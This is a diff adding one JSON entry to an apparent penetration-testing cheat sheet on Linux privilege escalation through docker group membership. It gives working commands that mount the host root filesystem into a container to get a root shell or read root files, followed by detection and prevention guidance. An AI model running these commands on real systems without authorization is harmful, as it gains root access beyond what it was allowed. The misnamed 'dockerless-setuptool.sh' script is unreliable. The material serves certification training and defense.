@@ -1,0 +1,99 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "docker"
+  ],
+  "tags": [
+    "docker",
+    "container-escape",
+    "privileged-group"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Privileged Groups",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Mount host / into a container and chroot to root",
+      "command": "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
+    },
+    {
+      "label": "Mount just /root to read root's files",
+      "command": "docker run -v /root:/mnt -it ubuntu"
+    },
+    {
+      "label": "One-shot flag read via a throwaway container",
+      "command": "docker run --rm -v /:/mnt ubuntu cat /mnt/root/flag.txt"
+    },
+    {
+      "label": "Interactive host-root shell",
+      "command": "docker pull ubuntu\ndocker run --rm -it -v /:/mnt ubuntu /bin/bash   # then: cat /mnt/root/flag.txt"
+    }
+  ],
+  "notes": "Membership in the docker group is root-equivalent: mount host / into a container and chroot in. The throwaway --rm one-liners read root files without leaving a container behind.",
+  "references": [
+    {
+      "title": "Docker Hub",
+      "url": "https://hub.docker.com/"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "group-lxd-lxc",
+      "note": "Same idea via LXD if docker isn't available.",
+      "rel": "alternative"
+    },
+    {
+      "id": "docker-socket-exposed",
+      "note": "Same escape from inside a container via the socket.",
+      "rel": "alternative"
+    },
+    {
+      "id": "linux-enum-users-groups",
+      "note": "Confirms docker group membership.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "group-docker",
+  "name": "Privileged Groups - Docker Group Escape",
+  "command": "docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash",
+  "description": "The docker group is root-equivalent: mount the host root filesystem into a container and chroot into it, or just read root-only files. One command to a host root shell.",
+  "opsec": "loud",
+  "mitre": [
+    "T1611"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Being in the 'docker' group grants access to the Docker socket. This is equivalent to unrestricted root access: 'docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash' mounts the entire host filesystem and opens a root shell in a container with full host access, bypassing all filesystem permissions.",
+    "prerequisites": "Attacker's user is a member of the 'docker' group. Docker daemon running. Internet access or a local image available.",
+    "impact": "Root shell on the host via a privileged container. Full read/write access to the entire host filesystem. Persistent backdoor installation.",
+    "detection": "Docker commands issued by docker-group members. Container started with host root mount. Docker audit log: new container with / volume from non-admin user. EDR: chroot executed inside container.",
+    "artifacts": "Docker daemon log (container with host / mount) | Auditd: docker run by non-root group member | EDR: host filesystem access from container process",
+    "prevention": "Treat docker group membership as root equivalent. Remove all unnecessary users from docker group. Use rootless Docker instead. For CI/CD, use Podman with user namespaces instead of root-mode Docker.",
+    "misconfiguration": "Developer or service account added to 'docker' group for convenience, effectively granting root access to the system.",
+    "vulnerable_config": "# User in docker group (equivalent to root)\nid\n# uid=1000(dev) groups=...,999(docker)\n\n# Trivial root: \ndocker run -v /:/mnt --rm -it ubuntu chroot /mnt bash",
+    "secure_config": "# Remove from docker group\ngpasswd -d dev docker\n\n# Use rootless Docker for developers\ndockerless-setuptool.sh install\n\n# If docker group needed, audit and limit to specific hosts/VMs only\n# Never add docker group members on production systems",
+    "sources": [
+      "HTB M25",
+      "MITRE T1610",
+      "MITRE T1611"
+    ]
+  }
+}
